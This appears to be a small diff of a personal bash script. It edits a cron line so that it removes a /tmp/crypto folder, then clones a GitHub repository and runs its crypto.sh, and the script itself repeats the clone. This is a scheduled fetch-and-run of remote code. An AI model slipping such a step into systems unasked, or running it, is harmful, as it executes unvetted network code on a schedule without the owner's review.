@@ -1,5 +1,5 @@
 #!/bin/bash
-# 10 8 * * *  cd /tmp/ && git clone https://github.com/hale777/crypto.git && cd crypto && chmod +x crypto.sh && ./crypto.sh
+# 10 8 * * *  cd /tmp/ && rm -rif crypto && git clone https://github.com/hale777/crypto.git && cd crypto && chmod +x crypto.sh && ./crypto.sh
 cd /tmp/
 git clone https://github.com/hale777/crypto.git
 cd crypto
